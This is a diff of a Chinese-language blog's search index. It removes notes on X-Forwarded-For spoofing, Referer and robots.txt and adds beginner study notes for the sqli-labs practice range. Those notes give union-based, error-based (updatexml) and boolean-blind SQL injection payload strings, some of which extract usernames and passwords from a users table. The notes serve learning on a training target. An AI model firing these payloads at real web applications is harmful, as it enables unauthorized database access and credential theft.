@@ -4,9 +4,9 @@
   
   
   <entry>
-    <title>page</title>
-    <link href="/2022/12/25/page/"/>
-    <url>/2022/12/25/page/</url>
+    <title>titlle</title>
+    <link href="/2023/02/13/uoload%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/"/>
+    <url>/2023/02/13/uoload%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/</url>
     
     <content type="html"><![CDATA[]]></content>
     
@@ -17,11 +17,24 @@
   
   
   <entry>
-    <title>初涉2</title>
-    <link href="/2022/11/22/%E5%88%9D%E6%B6%89/"/>
-    <url>/2022/11/22/%E5%88%9D%E6%B6%89/</url>
+    <title>page</title>
+    <link href="/2022/12/25/ctf%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"/>
+    <url>/2022/12/25/ctf%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/</url>
     
-    <content type="html"><![CDATA[<p>xff：</p><p>很多HTTP代理会在HTTP协议头中添加X-Forwarded-For头，用来追踪请求的来源。</p><p>X-Forwarded-For的格式如下：</p><pre><code class="hljs">X-Forwarded-For: client1, proxy1, proxy2</code></pre><p>X-Forwarded-For包含多个IP地址，每个值通过逗号+空格分开，最左边（client1）是最原始客户端的IP地址，如果有多层代理，每一层代理会将连接它的客户端IP追加在X-Forwarded-For右边。</p><p>一般的客户端发送HTTP请求没有X-Forwarded-For头的，当请求到达第一个代理服务器时，代理服务器会加上X-Forwarded-For请求头，并将值设为客户端的IP地址（也就是最左边第一个值），后面如果还有多个代理，会依次将IP追加到X-Forwarded-For头最右边，最终请求到达Web应用服务器，应用通过获取X-Forwarded-For头取左边第一个IP即为客户端真实IP。</p><p>但是如果客户端在发起请求时，请求头上带上一个伪造的X-Forwarded-For，由于后续每层代理只会追加而不会覆盖，那么最终到达应用服务器时，获取的左边第一个IP地址将会是客户端伪造的IP。伪造X-Forwarded-For头只需加上X-Forwarded-For头就可以<br>referer：</p><p>HTTP 请求的头信息里面，Referer 是一个常见字段，提供访问来源的信息。这个字段是可选的。客户端发送请求的时候，自主决定是否加上该字段。<br>————————————————<br>版权声明：本文为CSDN博主「canoa丶」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_45746283/article/details/127876705">https://blog.csdn.net/weixin_45746283/article/details/127876705</a></p><pre><code class="hljs">《robots协议》</code></pre><p>robots协议也称爬虫协议、爬虫规则等,是指网站可建立一个robots.txt文件来告诉搜索引擎哪些页面可以抓取,哪些页面不能抓取,而搜索引擎则通过读取robots.txt文件来识别这个页面是否允许被抓取。但是,这个robots协议不是防火墙,也没有强制执行力,搜索引擎完全可以忽视robots.txt文件去抓取网页的快照。 [5]  如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。<br>robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。</p>]]></content>
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>sql</title>
+    <link href="/2022/11/22/sql%E9%9D%B6%E5%9C%BA%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9F%BA%E7%A1%80%E7%9A%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%EF%BC%89/"/>
+    <url>/2022/11/22/sql%E9%9D%B6%E5%9C%BA%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9F%BA%E7%A1%80%E7%9A%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%EF%BC%89/</url>
+    
+    <content type="html"><![CDATA[<p>一、联合注入（页面有信息回显时）</p><pre><code class="hljs">首先判断注入类型（在id后加上 &#39;或 &quot; ），通过页面报错判断闭合然后通过 ?id=1&#39; order by 3--+ 猜测列数（如果“+”被过滤，可以使用“#，%23”代替“--+”）接着通过 ?id=-1&#39;union select 1,2,3 --+ 得到会回显信息的字段。（sqli-labs是2和3回显）?id=-1&#39;union select 1,database(),3 --+ 得到当前数据库名?id=-1&#39;union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;--+（查询当前数据库中所有表的名字）?id=-1&#39;union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=&#39;数据库&#39; and table_name=&#39;表名&#39; --+?id=-1&#39;union select 1,group_concat(username),group_concat(password) from users --+(爆出字段信息)注：初学建议通过分析原码来学习理解注入语句（学习文章 https://blog.csdn.net/elephantxiang/article/details/120091507）</code></pre><p>二、报错注入（）<br>    判断闭合后，直接通过 and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+ 爆出数据库   </p><pre><code class="hljs">  and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) --+(爆出表名)and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()),1,31),0x7e),1) --+（爆出字段名）and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#39;^&#39;,password)) from users),1,31),0x7e),1) --+（得到信息）注：应学习updatexml（）函数与extractvalue（）函数，截取函数substr（），substr最多能截取32位。</code></pre><p>三、bool盲注</p><pre><code class="hljs">先判断闭合，当页面不会显示信息，但对错页面回显不同时，可以使用bool盲注首先猜测数据库的长度 id=1’ and length(database())=8 --+ascii(substr(database(),1,1))=”ASCII“ --+（通过ASCII码值确定数据库名）and (select count(table_name) from information_schema.tables where table_schema=database())=1 --+（爆表的数量）and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+（变换 x 和 y 的值我们可以得到所有的表名。）?id=1&#39; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;表名&quot; limit x,1),y)=&quot;&quot;--+（爆字段名）?id=1&#39; and left((select ‘字段’ from ‘表名’ limit x,1),y)=&quot;&quot;--+（得到数据）注：通过python脚本可以辅助盲注</code></pre><p>四、延时注入</p>]]></content>
     
     
     
@@ -31,10 +44,10 @@
   
   <entry>
     <title>学习笔记 一</title>
-    <link href="/2022/09/20/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/"/>
-    <url>/2022/09/20/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80/</url>
+    <link href="/2022/09/20/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89-%E4%B8%80/"/>
+    <url>/2022/09/20/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89-%E4%B8%80/</url>
     
-    <content type="html"><![CDATA[<p>创建博客的确是一个天才的想法，作为小白的我在这一过程中收获巨大，虽然期间确实困难重重，但是苦尽甘来，最终完成的那一刻，心情是难以表述的。</p>]]></content>
+    <content type="html"><![CDATA[]]></content>
     
     
     
